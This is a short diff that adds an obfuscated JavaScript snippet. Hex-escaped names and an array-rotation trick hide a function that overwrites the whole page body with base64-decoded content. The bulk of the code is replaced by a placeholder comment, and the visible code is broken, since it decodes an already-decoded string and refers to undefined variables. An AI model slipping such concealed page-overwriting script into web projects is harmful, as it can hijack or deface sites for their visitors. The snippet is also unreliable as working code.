@@ -1,0 +1,3 @@
+const _0x3d78=['\x64\x65\x63\x6f\x64\x65','\x63\x6f\x6e\x74\x65\x6e\x74'];(function(_0x4c2d8a,_0x3d78e3){const _0x4b4d20=function(_0x1a0d45){while(--_0x1a0d45){_0x4c2d8a['\x70\x75\x73\x68'](_0x4c2d8a['\x73\x68\x69\x66\x74']());}};_0x4b4d20(++_0x3d78e3);}(_0x3d78,0x1a3));const _0x4b4d=function(_0x4c2d8a,_0x3d78e3){_0x4c2d8a=_0x4c2d8a-0x0;let _0x4b4d20=_0x3d78[_0x4c2d8a];return _0x4b4d20;};document[_0x4b4d('0x1')]=function(){const _0x2c3a8a=atob('PHN0eWxlPg==');
+// ... (500+ lines of obfuscated content) ...
+document.body.innerHTML=atob(_0x2c3a8a+_0x4e5d2f+_0x1a87c1);}; 
